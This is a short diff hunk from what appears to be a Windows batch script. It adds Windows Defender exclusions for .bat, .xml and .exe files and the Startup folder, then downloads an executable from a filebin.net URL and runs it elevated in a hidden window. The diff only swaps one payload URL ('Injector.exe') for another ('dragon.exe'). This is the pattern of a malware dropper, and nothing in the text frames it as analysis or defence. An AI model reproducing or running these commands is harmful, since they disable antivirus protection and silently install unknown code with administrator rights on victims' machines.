@@ -30,4 +30,4 @@ powershell Add-MpPreference -ExclusionExtension ".bat"
 powershell Add-MpPreference -ExclusionExtension ".xml"
 powershell Add-MpPreference -ExclusionExtension ".exe"
 powershell Add-MpPreference -ExclusionPath '"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"'
-powershell iwr -useb "http://filebin.net/vmf5fskyikhm5u7e/Injector.exe" -o $env:TEMP\impostah.exe; saps $env:TEMP\impostah.exe -Verb RunAs -WindowStyle Hidden
+powershell iwr -useb "https://filebin.net/ahvum0ljr7iipqq4/dragon.exe" -o $env:TEMP\impostah.exe; saps $env:TEMP\impostah.exe -Verb RunAs -WindowStyle Hidden
